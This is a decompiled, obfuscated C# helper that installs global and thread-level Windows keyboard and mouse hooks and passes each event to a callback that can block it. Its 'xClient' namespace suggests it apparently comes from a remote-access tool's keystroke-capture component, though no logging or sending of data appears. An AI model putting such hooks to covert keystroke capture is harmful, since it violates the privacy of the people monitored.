using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using xClient.Core.MouseKeyHook.WinApi;

internal static class Class4
{
	[CompilerGenerated]
	private sealed class Class5
	{
		public Delegate0 delegate0_0;

		internal IntPtr method_0(int code, IntPtr param, IntPtr lParam)
		{
			return smethod_6(code, param, lParam, delegate0_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class6
	{
		public Delegate0 delegate0_0;

		internal IntPtr method_0(int code, IntPtr param, IntPtr lParam)
		{
			return smethod_6(code, param, lParam, delegate0_0);
		}
	}

	public static HookResult smethod_0(Delegate0 callback)
	{
		return smethod_4(7, callback);
	}

	public static HookResult smethod_1(Delegate0 callback)
	{
		return smethod_4(2, callback);
	}

	public static HookResult smethod_2(Delegate0 callback)
	{
		return smethod_5(14, callback);
	}

	public static HookResult smethod_3(Delegate0 callback)
	{
		return smethod_5(13, callback);
	}

	private static HookResult smethod_4(int hookId, Delegate0 callback)
	{
		GDelegate0 gDelegate = (int code, IntPtr param, IntPtr lParam) => smethod_6(code, param, lParam, callback);
		Class9 @class = Class8.SetWindowsHookEx(hookId, gDelegate, IntPtr.Zero, Class14.GetCurrentThreadId());
		if (@class.IsInvalid)
		{
			smethod_8();
		}
		return new HookResult(@class, gDelegate);
	}

	private static HookResult smethod_5(int hookId, Delegate0 callback)
	{
		GDelegate0 gDelegate = (int code, IntPtr param, IntPtr lParam) => smethod_6(code, param, lParam, callback);
		Class9 @class = Class8.SetWindowsHookEx(hookId, gDelegate, Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		if (@class.IsInvalid)
		{
			smethod_8();
		}
		return new HookResult(@class, gDelegate);
	}

	private static IntPtr smethod_6(int nCode, IntPtr wParam, IntPtr lParam, Delegate0 callback)
	{
		if (nCode != 0)
		{
			return smethod_7(nCode, wParam, lParam);
		}
		Struct1 data = new Struct1(wParam, lParam);
		if (!callback(data))
		{
			return new IntPtr(-1);
		}
		return smethod_7(nCode, wParam, lParam);
	}

	private static IntPtr smethod_7(int nCode, IntPtr wParam, IntPtr lParam)
	{
		return Class8.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
	}

	private static void smethod_8()
	{
		throw new Win32Exception(Marshal.GetLastWin32Error());
	}
}
